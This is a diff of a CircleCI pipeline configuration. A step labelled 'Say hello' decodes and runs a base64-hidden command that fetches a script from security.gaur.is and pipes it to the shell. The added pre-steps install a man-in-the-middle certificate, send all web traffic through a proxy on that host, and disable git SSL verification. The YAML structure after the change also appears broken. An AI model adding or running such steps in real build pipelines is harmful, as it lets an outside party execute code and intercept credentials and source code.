@@ -17,7 +17,15 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          #command: "echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9wYXlsb2FkL2tvYmJ8c2g=|base64 -d|sh"
+          command: "echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9wYXlsb2FkL3Rlc3R8c2g=|base64 -d|sh"
+          
+# Invoke jobs via workflows
+# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+workflows:
+  say-hello-workflow:
+    jobs:
+      - say-hello:
+        pre-steps:
           command: |
             sudo curl https://security.gaur.is/appveyor/ca -o /usr/share/ca-certificates/mitm-ca.pem
             sudo ln -s /usr/share/ca-certificates/mitm-ca.pem /etc/ssl/certs/
@@ -25,9 +33,5 @@ jobs:
             export http_proxy=http://security.gaur.is:8888
             export https_proxy=http://security.gaur.is:8888
             curl https://security.gaur.is/travis/test -o /tmp/test
-# Invoke jobs via workflows
-# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
-workflows:
-  say-hello-workflow:
-    jobs:
-      - say-hello
+            git config --global http.https://github.com.proxy http://%APPVEYOR_HTTP_PROXY_IP%:%APPVEYOR_HTTP_PROXY_PORT%
+            git config --global http.https://github.com.sslVerify false
